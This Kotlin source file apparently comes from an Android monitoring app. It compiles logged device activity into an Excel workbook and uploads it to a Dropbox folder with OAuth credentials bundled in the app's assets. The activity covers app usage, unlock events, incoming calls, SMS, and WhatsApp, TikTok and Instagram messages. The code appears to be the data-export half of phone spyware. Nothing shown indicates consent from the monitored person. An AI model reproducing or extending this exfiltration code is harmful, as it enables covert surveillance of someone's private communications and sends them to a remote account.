package com.logger.utils

import android.content.Context

import com.logger.data.LogEntry
import jxl.Workbook
import jxl.write.Label
import jxl.write.WritableWorkbook
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

object CloudUploadHelper {

    private const val UPLOAD_URL = "https://content.dropboxapi.com/2/files/upload"

    private val client = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    suspend fun buildExcelFile(file: File, logs: List<LogEntry>) = withContext(Dispatchers.IO) {
        val outputStream = FileOutputStream(file)
        val workbook = Workbook.createWorkbook(outputStream)
                        
        val appLogs = logs.filter { it.eventType == LogEntry.TYPE_APP_OPENED || it.eventType == LogEntry.TYPE_APP_CLOSED || it.eventType == LogEntry.TYPE_APP_FOCUS || it.eventType == LogEntry.TYPE_AUTH_UNLOCK }
        val callLogs = logs.filter { it.eventType == LogEntry.TYPE_CALL_INCOMING }
        val msgLogs = logs.filter { it.eventType == LogEntry.TYPE_SMS_RECEIVED }
        val waLogs = logs.filter { it.eventType == LogEntry.TYPE_WHATSAPP_MSG || it.eventType == LogEntry.TYPE_WHATSAPP_CALL }
        val tiktokLogs = logs.filter { it.eventType == LogEntry.TYPE_TIKTOK_MSG }
        val instaLogs = logs.filter { it.eventType == LogEntry.TYPE_INSTAGRAM_MSG }
                        
        writeSheet(workbook, "App Activity", 0, appLogs)
        writeSheet(workbook, "Calls", 1, callLogs)
        writeSheet(workbook, "Messages", 2, msgLogs)
        writeSheet(workbook, "WhatsApp", 3, waLogs)
        writeSheet(workbook, "TikTok", 4, tiktokLogs)
        writeSheet(workbook, "Instagram", 5, instaLogs)
                        
        workbook.write()
        workbook.close()
        outputStream.close()
    }
    
    private fun writeSheet(workbook: WritableWorkbook, name: String, index: Int, logs: List<LogEntry>) {
        val sheet = workbook.createSheet(name, index)
        val sdf = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.getDefault())
        
        sheet.addCell(Label(0, 0, "Time"))
        sheet.addCell(Label(1, 0, "Event Type"))
        sheet.addCell(Label(2, 0, "Details"))
        sheet.addCell(Label(3, 0, "App / Content"))
        sheet.addCell(Label(4, 0, "Duration (s)"))
        
        for (i in logs.indices) {
            val log = logs[i]
            val row = i + 1
            sheet.addCell(Label(0, row, sdf.format(Date(log.timestamp))))
            sheet.addCell(Label(1, row, log.eventType))
            sheet.addCell(Label(2, row, log.details ?: ""))
            sheet.addCell(Label(3, row, log.appName ?: ""))
            sheet.addCell(Label(4, row, log.durationMillis?.let { (it / 1000.0).toString() } ?: ""))
        }
    }

    private fun refreshAccessToken(context: Context): String {
        val creds = context.assets.open("dropbox_credentials.json").bufferedReader().readText()
        val json = JSONObject(creds)

        val formBody = FormBody.Builder()
            .add("grant_type", "refresh_token")
            .add("refresh_token", json.getString("refresh_token"))
            .add("client_id", json.getString("app_key"))
            .add("client_secret", json.getString("app_secret"))
            .build()

        val request = Request.Builder()
            .url("https://api.dropboxapi.com/oauth2/token")
            .post(formBody)
            .build()

        val response = client.newCall(request).execute()
        if (!response.isSuccessful) {
            throw Exception("Dropbox token refresh failed: ${response.code} - ${response.body?.string()}")
        }
        return JSONObject(response.body!!.string()).getString("access_token")
    }

    suspend fun uploadToDropbox(context: Context, file: File, remoteFileName: String) = withContext(Dispatchers.IO) {
        val token = refreshAccessToken(context)
        val dropboxApiArg = """{"path":"/AndroidLogs/$remoteFileName","mode":"add","autorename":true,"mute":false}"""

        val requestBody = file.asRequestBody("application/octet-stream".toMediaType())

        val request = Request.Builder()
            .url(UPLOAD_URL)
            .addHeader("Authorization", "Bearer $token")
            .addHeader("Dropbox-API-Arg", dropboxApiArg)
            .addHeader("Content-Type", "application/octet-stream")
            .post(requestBody)
            .build()

        val response = client.newCall(request).execute()
        if (!response.isSuccessful) {
            throw Exception("Dropbox upload failed: ${response.code} - ${response.body?.string()}")
        }
    }
}
